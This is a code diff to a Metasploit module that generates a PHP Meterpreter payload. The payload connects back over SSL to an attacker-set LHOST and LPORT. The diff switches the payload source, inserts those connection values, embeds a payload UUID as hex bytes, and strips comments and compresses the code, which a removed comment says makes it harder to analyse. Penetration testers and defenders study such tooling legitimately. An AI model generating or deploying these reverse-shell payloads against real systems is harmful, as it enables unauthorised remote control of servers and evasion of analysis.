@@ -27,20 +27,19 @@ module MetasploitModule
   end
 
   def generate
-    file = File.join(Msf::Config.data_directory, "meterpreter", 'meterpreter_ssl.php')
-    met = File.open(file, "rb") {|f|
-      f.read(f.stat.size)
-    }
+
+    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
     met.gsub!("ion connect($ipaddr, $port, $proto='tcp')","ion connect($ipaddr, $port, $proto='ssl')")
-    met.gsub!("127.0.0.1", datastore['LHOST'].to_s) if datastore['LHOST']
+
+    met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
     met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
-    # Enable SSL mode
-    met.gsub!('($ipaddr, $port, $proto=\'tcp\')','($ipaddr, $port, $proto=\'ssl\')')
-    # XXX When this payload is more stable, remove comments and compress
-    # whitespace to make it smaller and a bit harder to analyze
-    met.gsub!(/#.*$/, '')
+
+    uuid = generate_payload_uuid
+    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
+    met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")
+
+    met.gsub!(/#.*$/, '') 
     met = Rex::Text.compress(met)
-    #vprint_good(met.to_s)
     return met
   end
 end
